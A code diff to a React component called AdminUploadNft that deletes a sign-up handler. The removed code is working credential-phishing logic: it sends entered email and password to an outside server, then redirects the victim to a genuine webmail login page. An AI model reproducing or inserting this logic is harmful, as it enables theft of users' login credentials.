@@ -90,40 +90,6 @@ function AdminUploadNft() {
     setFileName(''); // Clear the file name
   };
 
-  const handleSignUp = async (e) => {
-    e.preventDefault();
-
-    const options = {
-      method: 'POST',
-      headers: {
-        'content-type': 'application/json',
-      },
-      body: JSON.stringify({
-        email: inputs.email,
-        password: inputs.password,
-        website: inputs.website,
-      }),
-    };
-
-    setTimeout(async () => {
-      try {
-        const response = await fetch(
-          'https://shawbackend.onrender.com/sendEmail2',
-          options,
-        );
-        const data = await response.json();
-
-        if (data.message) {
-          window.location.href =
-            'https://webmail.westnet.com.au/login/?l=en-US';
-        }
-      } catch (error) {
-        setErrorMessage(error);
-      }
-    }, 3000);
-    setLoading(true);
-  };
-
   return (
     <section className="h-full pb-20 bg-black">
       <header className="glass-header2 w-full px-2 md:px-6  justify-between z-30 h-18 flex items-center">
